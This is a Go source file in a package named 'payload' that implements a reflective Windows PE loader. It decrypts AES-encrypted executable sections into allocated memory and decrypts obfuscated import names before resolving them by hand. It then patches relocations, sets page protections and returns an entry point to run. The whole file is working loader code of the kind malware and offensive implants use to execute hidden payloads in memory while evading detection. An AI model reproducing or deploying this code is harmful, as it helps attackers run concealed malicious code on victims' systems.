package payload

/*
	typedef void (*TLSCALLBACK)(void*,int,void*);
	void tls(int* func,int* handle){
		((TLSCALLBACK)func)(handle,0,0);
	}
*/
import "C"

import(
	"unsafe"
	"syscall"
	"errors"
	"log"
	"t1/crypto"
)	


type Ptr struct{
	Base unsafe.Pointer
}
func (p *Ptr)Pointer(offset uint32)uintptr{
	return uintptr(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))
}
func(p *Ptr)ToUint32Ptr(offset uint32)*Uint32Ptr{
	return &Uint32Ptr{(*uint32)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToBytePtr(offset uint32)*BytePtr{
	return &BytePtr{(*byte)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToUint16Ptr(offset uint32)*Uint16Ptr{
	return &Uint16Ptr{(*uint16)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToUintptr_Ptr(offset uint32)*Uintptr_Ptr{
	return &Uintptr_Ptr{(*uintptr)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToUint64Ptr(offset uint32)*Uint64Ptr{
	return &Uint64Ptr{(*uint64)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToIMAGE_SECTION_HEADER_Ptr(offset uint32)*IMAGE_SECTION_HEADER_Ptr{
	return &IMAGE_SECTION_HEADER_Ptr{(*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToIMAGE_IMPORT_DESCRIPTOR_Ptr(offset uint32)*IMAGE_IMPORT_DESCRIPTOR_Ptr{
	return &IMAGE_IMPORT_DESCRIPTOR_Ptr{(*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToIMAGE_NT_HEADERS_Ptr(offset uint32)*IMAGE_NT_HEADERS_Ptr{
	return &IMAGE_NT_HEADERS_Ptr{(*IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToIMAGE_RELOCATION_Ptr(offset uint32)*IMAGE_BASE_RELOCATION_Ptr{
	return &IMAGE_BASE_RELOCATION_Ptr{(*IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToIMAGE_IMPORT_BY_NAME_Ptr(offset uint32)*IMAGE_IMPORT_BY_NAME_Ptr{
	return &IMAGE_IMPORT_BY_NAME_Ptr{(*IMAGE_IMPORT_BY_NAME)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}

func(p *Ptr)ToIMAGE_THUNK_DATA_Ptr(offset uint32)*IMAGE_THUNK_DATA_Ptr{
	return &IMAGE_THUNK_DATA_Ptr{(*IMAGE_THUNK_DATA)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}
func(p *Ptr)ToIMAGE_EXPORT_DIRECTORY_Ptr(offset uint32)*IMAGE_EXPORT_DIRECTORY_Ptr{
	return &IMAGE_EXPORT_DIRECTORY_Ptr{(*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(uintptr(p.Base)+uintptr(offset)))}
}


type BytePtr struct{
	Base *byte
}

func(p *BytePtr)Get(index int)*byte{
	return (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}
type Uint16Ptr struct{
	Base *uint16
}

func(p *Uint16Ptr)Get(index uint32)*uint16{
	return (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}


type Uint32Ptr struct{
	Base *uint32
}

func(p *Uint32Ptr)Get(index uint32)*uint32{
	return (*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}
type Uint64Ptr struct{
	Base *uint64
}

func(p *Uint64Ptr)Get(index uint32)*uint64{
	return (*uint64)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}
type Uintptr_Ptr struct{
	Base *uintptr
}
func(p *Uintptr_Ptr)Get(index uint32)*uintptr{
	return (*uintptr)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}
type IMAGE_SECTION_HEADER_Ptr struct{
	Base *IMAGE_SECTION_HEADER
}


func(p *IMAGE_SECTION_HEADER_Ptr)Get(index uint32)*IMAGE_SECTION_HEADER{
	return (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}

type IMAGE_IMPORT_DESCRIPTOR_Ptr struct{
	Base *IMAGE_IMPORT_DESCRIPTOR
}
func(p *IMAGE_IMPORT_DESCRIPTOR_Ptr)Get(index uint32)*IMAGE_IMPORT_DESCRIPTOR{
	return (*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}

type IMAGE_IMPORT_BY_NAME_Ptr struct{
	Base *IMAGE_IMPORT_BY_NAME
}

func(p *IMAGE_IMPORT_BY_NAME_Ptr)Get(index uint32)*IMAGE_IMPORT_BY_NAME{
	return (*IMAGE_IMPORT_BY_NAME)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}


type IMAGE_THUNK_DATA_Ptr struct{
	Base *IMAGE_THUNK_DATA
}

func(p *IMAGE_THUNK_DATA_Ptr)Get(index uint32)*IMAGE_THUNK_DATA{
	return (*IMAGE_THUNK_DATA)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}




type IMAGE_BASE_RELOCATION_Ptr struct{
	Base *IMAGE_BASE_RELOCATION
}

func(p *IMAGE_BASE_RELOCATION_Ptr) Get(index uint32)*IMAGE_BASE_RELOCATION{
	return (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}


type IMAGE_EXPORT_DIRECTORY_Ptr struct{
	Base *IMAGE_EXPORT_DIRECTORY
}
func(p * IMAGE_EXPORT_DIRECTORY_Ptr) Get(index uint32)*IMAGE_EXPORT_DIRECTORY{
	return (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}


type IMAGE_NT_HEADERS_Ptr struct{
	Base *IMAGE_NT_HEADERS
}
func(p * IMAGE_NT_HEADERS_Ptr) Get(index uint32)*IMAGE_NT_HEADERS{
	return (*IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(unsafe.Pointer(p.Base))+unsafe.Sizeof(*p.Base)*uintptr(index)))
}


func GetByteSlice(start *byte)(name []byte){
	var p *byte=start
	for{
		if *p==0{
			break;
		}
		name=append(name,*p)
		p=(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(p))+uintptr(1)))

	}
	name=append(name,0);
	return
}

func memcpy(start *byte ,end,size uintptr ){
	var i uintptr=0
	for ;i<size;i++{
		*(*byte)(unsafe.Pointer(end+i))=*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(start))+i))
	}
}

type Refloader struct{
	FileHeaderInfo
	funcs []*syscall.Proc
	
	a *crypto.AseECB
	
	pMemBase *Ptr
	pImportTable *IMAGE_IMPORT_DESCRIPTOR_Ptr
	
	//pReloadTable *IMAGE_BASE_RELOCATION_Ptr

	pExportTable *IMAGE_EXPORT_DIRECTORY_Ptr
	

	pExceptTable uintptr
	

	
	

	CodeEntry uintptr
	file []byte
	delta uintptr
}
func(r *Refloader)GetOrdinal(funcName []byte)(o uint32){
	o=0
	
	for _,item:=range funcName{
		if item>='0' && item<='9'{
			o=o*10+uint32(item-'0')
		}
	}
	return
}
func(r *Refloader)ProcessTransferName(name []byte)(dllName,funcName []byte){
	var index=0
	var item byte
	

	for index,item=range name{
		if item=='.'{
			break;
		}
		dllName=append(dllName,item)
		

	}
	dllName=append(dllName,'.')
	dllName=append(dllName,'d')
	dllName=append(dllName,'l')
	dllName=append(dllName,'l')
	dllName=append(dllName,0);
	index=index+1
	for ;index<len(name);index++{
		funcName=append(funcName,name[index]);
	}
	return
}

func(r * Refloader)GetProcAddrByOrdinal(h uintptr,o uint32)uintptr{
	base:=&Ptr{Base:unsafe.Pointer(h)}
	offset:=*(base.ToUint32Ptr(0x3c).Get(0))
	pntheader:=base.ToIMAGE_NT_HEADERS_Ptr(offset).Get(0)
	pexpTable:=base.ToIMAGE_EXPORT_DIRECTORY_Ptr(pntheader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]. VirtualAddress).Get(0)
	nExportTable:=*(base.ToUint32Ptr(pexpTable.AddressOfFunctions).Get(0))
	pFunction:=base.ToUint32Ptr(pexpTable.AddressOfFunctions)
	a:=uintptr(unsafe.Pointer(pexpTable))
	_=a
	nBase:=pexpTable.Base
	index:=o-nBase
	funcAddr:=base.Pointer(*(pFunction.Get(index)))
	
	if funcAddr>=uintptr(unsafe.Pointer(pexpTable)) && funcAddr<=uintptr(unsafe.Pointer(pexpTable)) +uintptr(nExportTable){
		transferName:=GetByteSlice((*byte)(unsafe.Pointer(funcAddr)))
		dllName,funcName:=r.ProcessTransferName(transferName)
		
		h1,_,_:=r.funcs[5].Call(uintptr(unsafe.Pointer(&dllName[0])));
		if funcName[0]=='#'{
			return r.GetProcAddrByOrdinal(h1,r.GetOrdinal(funcName))
		}
		return r.GetProcAddrByName(h1,funcName)
	}
	return funcAddr

}
func IsSliceEqual(src,des []byte)bool{
	if len(src)!=len(des){
		return false
	}
	for index:=range src{
		if src[index]!=des[index]{
			return false
		}
	}
	return true
}
func(r * Refloader)GetProcAddrByName(h1 uintptr,name []byte)uintptr{
	base:=&Ptr{Base:unsafe.Pointer(h1)}
	offset:=*(base.ToUint32Ptr(0x3c).Get(0))
	pntheader:=base.ToIMAGE_NT_HEADERS_Ptr(offset).Get(0)
	pexpTable:=base.ToIMAGE_EXPORT_DIRECTORY_Ptr(pntheader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]. VirtualAddress).Get(0)
	nExportTable:=*(base.ToUint32Ptr(pexpTable.AddressOfFunctions).Get(0))
	pName:=base.ToUint32Ptr(pexpTable.AddressOfNames)
	pOrdinal:=base.ToUint16Ptr(pexpTable.AddressOfNameOrdinals)
	pFunction:=base.ToUint32Ptr(pexpTable.AddressOfFunctions)
	nameNums:=pexpTable.NumberOfNames
	a:=uintptr(unsafe.Pointer(pexpTable))
	_=a
	var nameIndex uint32=0
	
	for ;nameIndex<nameNums;nameIndex++{

		bName:=base.ToBytePtr(*(pName.Get(nameIndex)));
		expName:=GetByteSlice(bName.Get(0));
		
		if IsSliceEqual(name,expName){
			index:=*(pOrdinal.Get(nameIndex));
			funcAddr:=base.Pointer(*(pFunction.Get(uint32(index))))
			if funcAddr>=uintptr(unsafe.Pointer(pexpTable)) && funcAddr<=uintptr(unsafe.Pointer(pexpTable)) +uintptr(nExportTable){
				transferName:=GetByteSlice((*byte)(unsafe.Pointer(funcAddr)))
				dllName,funcName:=r.ProcessTransferName(transferName)
				
				
				h2,_,_:=r.funcs[5].Call(uintptr(unsafe.Pointer(&dllName[0])));
				if funcName[0]=='#'{
					return r.GetProcAddrByOrdinal(h2,r.GetOrdinal(funcName))
				}
				if dllName[0]=='a' && dllName[1]=='p' && dllName[2]=='i'{
					addr,_,_:=r.funcs[7].Call(h2,uintptr(unsafe.Pointer(&funcName[0])))
					if addr==0{
						log.Println("get proc addr error");
						return 0;
					}
					return addr
				}
				return r.GetProcAddrByName(h2,funcName)
			}
			return funcAddr
		}

	}
	return 0
}


func(r *Refloader)ProcessImportTable()error{
	var i uint32=0
	end:=IMAGE_IMPORT_DESCRIPTOR{0,0,0,0,0}
	var pName *byte
	
	var funcAddr uintptr=0
	var funcIndex uint32=0
	var flag uint64 =0
	
	for{

		imtTableEntry:=r.pImportTable.Get(i);
		if *imtTableEntry==end {
			break
		}
		
		pName=r.pMemBase.ToBytePtr(imtTableEntry.Name).Get(0)
		
		name:=GetByteSlice(pName);
		ImportDecrypt(name)
		
		pdllBase,_,_:=r.funcs[5].Call(uintptr(unsafe.Pointer(&name[0])))
		if(pdllBase==0){
			return errors.New("load dll error")
		}
		
		//log.Printf("%s-%p\r\n",name,pdllBase)
		pFuncName:=imtTableEntry.OriginalFirstThunk
		pFuncAddr:=imtTableEntry.FirstThunk
		if imtTableEntry.OriginalFirstThunk==0{
			pFuncName=imtTableEntry.FirstThunk
		}
		pThnkData:=r.pMemBase.ToIMAGE_THUNK_DATA_Ptr(pFuncName);
		pThnkAddr:=r.pMemBase.ToIMAGE_THUNK_DATA_Ptr(pFuncAddr);
		if pThnkData.Get(0).AddressOfData==0{
			return errors.New("AddressOfData 为 0error")
		}
		funcAddr=0
		funcIndex=0
		
		for{
			data:=pThnkData.Get(funcIndex).AddressOfData
			if data==0{
				break
			}
			if unsafe.Sizeof(funcAddr)==4{
				flag=uint64(data& 0x80000000)
			}else{
				flag=uint64(data) & 0x8000000000000000
			}
			if flag!=0{
				
				funcAddr=r.GetProcAddrByOrdinal(pdllBase,uint32(data& 0xffff))
				//log.Printf("%d-%p\r\n",data& 0xffff,funcAddr)
			}else{
				pFuncName:=GetByteSlice(&r.pMemBase.ToIMAGE_IMPORT_BY_NAME_Ptr(uint32(data)).Get(0).Name[0])
				ImportDecrypt(pFuncName)
				//log.Printf("%s\r\n",pFuncName)
				funcAddr=r.GetProcAddrByName(pdllBase,pFuncName);
				
				
			}
			
			if funcAddr==0{
				return errors.New("func addr == 0 error")
			}
			pThnkAddr.Get(funcIndex).AddressOfData=funcAddr
			funcIndex=funcIndex+1
		}
		i=i+1
	}
	return nil
}



func(r * Refloader)ProcessReloadTable(){
	var nProcedBlcok uint32=0
	var pReloadTable *IMAGE_BASE_RELOCATION
	var pOffset *Uint16Ptr
	var pageOffset uint16
	var pageOffsetFlag uint16
	var typeOffset uint16
	
	
	for nProcedBlcok<r.ReloadTableSize{
		pReloadTable=r.pMemBase.ToIMAGE_RELOCATION_Ptr(r.ReloadTableOffset+nProcedBlcok).Get(0)
		nItem:=(pReloadTable.SizeOfBlock-8)/2
		pOffset=&Uint16Ptr{(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(pReloadTable))+uintptr(8)))}
		var pUint32 *uint32
		var k uint32=0
		for ;k<nItem;k++{
			typeOffset=*(pOffset.Get(k))
			pageOffsetFlag=typeOffset>>12
			pageOffset=typeOffset&0x0fff
			switch pageOffsetFlag{
			case IMAGE_REL_BASED_ABSOLUTE:
				
			case IMAGE_REL_BASED_HIGH:
				*(r.pMemBase.ToUint16Ptr(pReloadTable.VirtualAddress+uint32(pageOffset)).Get(0))=*(r.pMemBase.ToUint16Ptr(pReloadTable.VirtualAddress+uint32(pageOffset)).Get(0))+uint16(r.delta>>16);
				
			case IMAGE_REL_BASED_LOW:
				*(r.pMemBase.ToUint16Ptr(pReloadTable.VirtualAddress+uint32(pageOffset)).Get(0))=*(r.pMemBase.ToUint16Ptr(pReloadTable.VirtualAddress+uint32(pageOffset)).Get(0))+uint16(r.delta&0xff);
				
			case IMAGE_REL_BASED_HIGHLOW:
				pUint32=r.pMemBase.ToUint32Ptr(pReloadTable.VirtualAddress+uint32(pageOffset)).Get(0)
				*pUint32=*pUint32+uint32(r.delta);
				//log.Printf("after reload:%X: %X\r\n",pReloadTable.VirtualAddress+uint32(pageOffset),*pUint32)

			case IMAGE_REL_BASED_DIR64:
				*(r.pMemBase.ToUint64Ptr(pReloadTable.VirtualAddress+uint32(pageOffset)).Get(0))=*(r.pMemBase.ToUint64Ptr(pReloadTable.VirtualAddress+uint32(pageOffset)).Get(0))+uint64(r.delta);
				
			}
		}
		
		nProcedBlcok=nProcedBlcok+pReloadTable.SizeOfBlock
	}
}


func( r *Refloader)ProcessExceptionTable(){
	if r.ExceptTableSize>0{
		r.funcs[6].Call(r.pExceptTable,uintptr(r.ExceptTableSize/12),uintptr(r.pMemBase.Base))
	}
	
}

func( r *Refloader)ProcessTlsTable(){
	var  p uintptr=0
	var i uint32=0
	//var fn *TLSCALLBACK
	var funcAddr uintptr
	base:=r.pMemBase.Pointer(0);
	if r.TlsTableSize>0{
		pUintptr:=r.pMemBase.ToUintptr_Ptr(r.TlsTableOffset+uint32(3*unsafe.Sizeof(p)))
		
		for *(pUintptr.Get(i))!=0{
			funcAddr=*(pUintptr.Get(i))
			C.tls((*C.int)(unsafe.Pointer(funcAddr)),(*C.int)(unsafe.Pointer(base)))
			i=i+1
		}
		
	}
	
}

func(r * Refloader)AdjustProtect(){
	var dwProtection uint32
	var oldProtect uintptr
	var i uint32
	for ;i<uint32(r.NSections);i++{
		if r.Sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE!=0 && r.Sections[i].Characteristics & IMAGE_SCN_MEM_WRITE !=0  && r.Sections[i].Characteristics & IMAGE_SCN_MEM_READ!=0 { //readwrite

            dwProtection = PAGE_EXECUTE_READWRITE;
        }else if r.Sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE!=0 && r.Sections[i].Characteristics & IMAGE_SCN_MEM_READ!=0 { //readwrite

            dwProtection = PAGE_EXECUTE_READ;
        }else if r.Sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE!=0 && r.Sections[i].Characteristics & IMAGE_SCN_MEM_WRITE !=0{ //readwrite

            dwProtection = PAGE_EXECUTE_WRITECOPY;

        }else if r.Sections[i].Characteristics & IMAGE_SCN_MEM_READ!=0 && r.Sections[i].Characteristics & IMAGE_SCN_MEM_WRITE!=0 { //readwrite

            dwProtection = PAGE_READWRITE;

        }else if r.Sections[i].Characteristics & IMAGE_SCN_MEM_WRITE!=0{
			dwProtection=PAGE_WRITECOPY;
		}else if r.Sections[i].Characteristics & IMAGE_SCN_MEM_READ!=0{
			dwProtection= PAGE_READONLY;
		}else if r.Sections[i].Characteristics &  IMAGE_SCN_MEM_EXECUTE!=0{
			dwProtection= PAGE_EXECUTE;
		}
		r.funcs[2].Call(r.pMemBase.Pointer(r.Sections[i].Memstart),uintptr(r.Sections[i].Memsize),uintptr(dwProtection),uintptr(unsafe.Pointer(&oldProtect)))
	}
	
}


func(r * Refloader)InitLoadEnvironment()(err error){

	
	addr,_,err:=r.funcs[1].Call(0,uintptr(r.ImageSize),uintptr(MEM_COMMIT|MEM_RESERVE),uintptr(PAGE_READWRITE))
	if addr==0{
		
		return 
	}
	
	r.delta=addr-r.ImageBase
	log.Printf("r.delta:%p",r.delta);
	r.pMemBase=&Ptr{Base:unsafe.Pointer(addr)};

	r.CodeEntry=r.pMemBase.Pointer(r.CodeEntryOffset)
	
	r.pImportTable=r.pMemBase.ToIMAGE_IMPORT_DESCRIPTOR_Ptr(r.ImportTableOffset)
	
	//r.pReloadTable=r.pMemBase.ToIMAGE_RELOCATION_Ptr(r.ReloadTableOffset)
	
	r.pExportTable=r.pMemBase.ToIMAGE_EXPORT_DIRECTORY_Ptr(r.ExportTableOffset);
	
	r.pExceptTable=r.pMemBase.Pointer(r.ExceptTableOffset);
	
	return nil
}



func(r *Refloader)ToMemFromFile()(err error){
	var i uint32=0
	
	//memcpy(&r.file[0],uintptr(r.pMemBase.Base),uintptr(r.headerSize))
	for ;i<uint32(r.NSections);i++{
		decrypted:=r.file[r.Sections[i].Filestart:r.Sections[i].Filestart+r.Sections[i].Filesize]
		plainText:=r.a.Decrypt(decrypted,crypto.Key,128)
		memcpy(&plainText[0],r.pMemBase.Pointer(r.Sections[i].Memstart),uintptr(r.Sections[i].Filesize))
		
	}
	return nil
}


func(r *Refloader)QuerySpecificExportFunc(exportFuncName string)uintptr{
	pexpTable:=r.pExportTable.Get(0);
	pName:=r.pMemBase.ToUint32Ptr(pexpTable.AddressOfNames)
	pOrdinal:=r.pMemBase.ToUint16Ptr(pexpTable.AddressOfNameOrdinals)
	pFunction:=r.pMemBase.ToUint32Ptr(pexpTable.AddressOfFunctions)
	nameNums:=pexpTable.NumberOfNames
	
	var nameIndex uint32=0
	
	for ;nameIndex<nameNums;nameIndex++{

		bName:=r.pMemBase.ToBytePtr(*(pName.Get(nameIndex)));
		expName:=GetByteSlice(bName.Get(0));
		
		if IsSliceEqual(expName,expName){
			index:=*(pOrdinal.Get(nameIndex));
			funcAddr:=r.pMemBase.Pointer(*(pFunction.Get(uint32(index))))
			
			return funcAddr
		}

	}
	return 0
}

func (r *Refloader)Load(exportFuncName string)(loadPtr uintptr,size uintptr,err error){
	err=r.InitLoadEnvironment()
	if err!=nil{
		return 0,0,err
	}
	err=r.ToMemFromFile()
	if err!=nil{
		return 0,0,err
	}
	log.Println("to mem")
	err=r.ProcessImportTable()
	if err!=nil{
		log.Printf("%s",err.Error())
		return 0,0,err
	}
	log.Println("IMPORT tABLE")
	
	r.ProcessReloadTable()
	log.Println("RELOAD tABLE")
	
	r.ProcessExceptionTable()
	log.Println("EXCEPTION tABLE")
	
	// r.ProcessTlsTable()
	// log.Println("TLS tABLE")
	r.AdjustProtect()
	
	log.Println("ADJUST")
	entryAddress:=r.CodeEntry
	if exportFuncName!=""{
		entryAddress=r.QuerySpecificExportFunc(exportFuncName)
	}
	if entryAddress==0{
		return 0,0,errors.New("entry addr 0")
	}
	
	return entryAddress,r.pMemBase.Pointer(0),nil
}